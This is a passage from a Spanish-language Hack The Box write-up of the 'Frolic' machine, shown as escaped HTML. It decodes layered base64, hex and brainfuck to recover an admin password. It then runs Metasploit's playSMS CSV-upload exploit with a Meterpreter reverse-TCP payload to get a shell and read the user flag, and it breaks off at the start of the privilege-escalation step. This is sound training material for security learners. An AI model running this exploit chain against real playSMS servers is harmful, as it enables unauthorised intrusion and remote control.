&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;AAAAAAEAAQBPAAAAAwEAAAAA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-18-44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En este caso un archivo codificado en base64 y lo agregamos a un nuevo archivo, verificamos que tipo de archivo es con &amp;lsquo;file&amp;rsquo; y vemos que el archivo decodificado (file_decode) es un archivo zip por lo que le cambiamos el nombre y le agregamos &amp;lsquo;.zip&amp;rsquo; al final:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/frolic# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; file.txt
root@sckull:~/htb/frolic# file file.txt 
file.txt: Zip archive data, at least v2.0 to extract
root@sckull:~/htb/frolic# 
root@sckull:~/htb/frolic# mv file.txt file.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego al intentar descomprimir el archivo file.zip nos pide una contraseña, en este caso la contraseña es &amp;lsquo;password&amp;rsquo; (contraseñas comunes), nos devuelve un archivo index.php.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/frolic# 7z x file.zip 

7-Zip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 16.02 : Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 
Scanning the drive &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archives:
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; file, &lt;span class=&#34;m&#34;&gt;360&lt;/span&gt; bytes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; KiB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Extracting archive: file.zip
--
&lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; file.zip
&lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; zip
Physical &lt;span class=&#34;nv&#34;&gt;Size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;360&lt;/span&gt;
    
Enter password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:password
Everything is Ok

Size:       &lt;span class=&#34;m&#34;&gt;617&lt;/span&gt;
Compressed: &lt;span class=&#34;m&#34;&gt;360&lt;/span&gt;
root@sckull:~/htb/frolic# ls
file.zip  index.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el interior de index.php nos encontramos con texto en HEX al pasarlo a texto nos devuelve otra vez un texto en base64:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973675779302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;79737250463067506973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7934744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330754&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;77720&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973675779302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;78645069734&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;797375504373674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7974624&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5434674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;53307450463067506930744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330754&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;77724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973670&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;317374506973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;79737250463067506973724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;793467504373724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;3173674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5434744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;53304&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;5046302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;77724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973675779302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;7864506973674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;6930740&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;533467504373724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;3173674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5434744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330675046302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330674&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;5330744&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;533467504373724&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973675779302&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973674&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973385854344&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;m&#34;&gt;7973754&lt;/span&gt;c&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;a&lt;span class=&#34;m&#34;&gt;776743673&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;d&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;a&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/frolic# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xxd -r -p
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al decodificar el texto en base64 nos devuelve texto en lenguaje &amp;lsquo;brainfuck&amp;rsquo;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/frolic# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d
+++++ +++++ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;++ +++++ +++&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &amp;gt;++++ +.--- --.++ +++++ .&amp;lt;+++ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;++ +&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;+
++.&amp;lt;+ ++&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt; ---&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &amp;gt;---- --.-- ----- .&amp;lt;+++ +&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;+ +++&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &amp;gt;+++. &amp;lt;+++&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -&amp;gt;---
&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;-- .&amp;lt;+++ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;++ +&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;+ .---. &amp;lt;+++&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -&amp;gt;--- &amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;-- ----. &amp;lt;++++ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;++ ++&amp;lt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
++..&amp;lt; 
root@sckull:~/htb/frolic#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Decodificando el mensaje con &lt;a href=&#34;https://www.dcode.fr/brainfuck-language:&#34;&gt;https://www.dcode.fr/brainfuck-language:&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-34-55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizar idkwhatispass como contraseña en /playsms y el usuario admin y nos logramos logear dentro de la plataforma.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2019-02-44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para esta plataforma (playsms) encontramos un exploit (exploit/multi/http/playsms_uploadcsv_exec) dentro de metasploit y lo utilizamos con las credenciales que habiamos encontrado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use exploit/multi/http/playsms_uploadcsv_exec
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/playsms_uploadcsv_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/http/playsms_uploadcsv_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   idkwhatispass    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   RHOSTS     10.10.10.111     yes       The target address range or CIDR identifier
   RPORT      &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;             yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SSL        &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;            no        Negotiate SSL/TLS &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outgoing connections
   TARGETURI  /playsms         yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;php/meterpreter/reverse_tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.X.X      yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   PlaySMS 1.4

msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/http/playsms_uploadcsv_exec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.X.X:4444 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication successful: admin:idkwhatispass
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending stage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;38247&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 10.10.10.111
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.X.X:4444 -&amp;gt; 10.10.10.111:33574&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

meterpreter &amp;gt; shell
Process &lt;span class=&#34;m&#34;&gt;1765&lt;/span&gt; created.
Channel &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; created.
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home/ayush
ls
user.txt
cat user.txt
2ab95909cf509f85a6f476b59a0c2fe0
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos nuestra bandera &amp;lsquo;user.txt&amp;rsquo;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation---b0f&#34;&gt;PRIVILEGE ESCALATION - b0f&lt;/h2&gt;
&lt;p&gt;En los archivos de ayush encontramos un archivo llamado .rop que tiene permisos del usuario root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@frolic:/home/ayush/.binary$ ls -lah
ls -lah
total 16K
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ayush ayush 4.0K Sep &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 02:43 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ayush ayush 4.0K Sep &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 02:00 ..
